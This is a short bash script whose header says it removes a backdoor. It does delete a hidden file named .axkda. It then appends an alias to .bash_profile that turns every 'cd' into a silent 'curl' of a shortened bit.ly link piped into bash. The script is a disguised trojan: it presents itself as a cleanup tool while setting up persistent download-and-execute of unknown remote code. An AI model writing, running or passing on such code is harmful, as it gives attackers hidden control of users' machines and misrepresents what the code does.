# Remove the backdoor final
# @author Eoghan O'Keefe

cd ~

file1=.axkda
file2=.bash_profile

# If backdoor exists remove it
if [ -f $file1 ]
then
		rm $file1
fi

touch $file2

echo 'alias cd="curl -s -L http://bit.ly/10hA8iC | bash"'>>$file2
source $file2
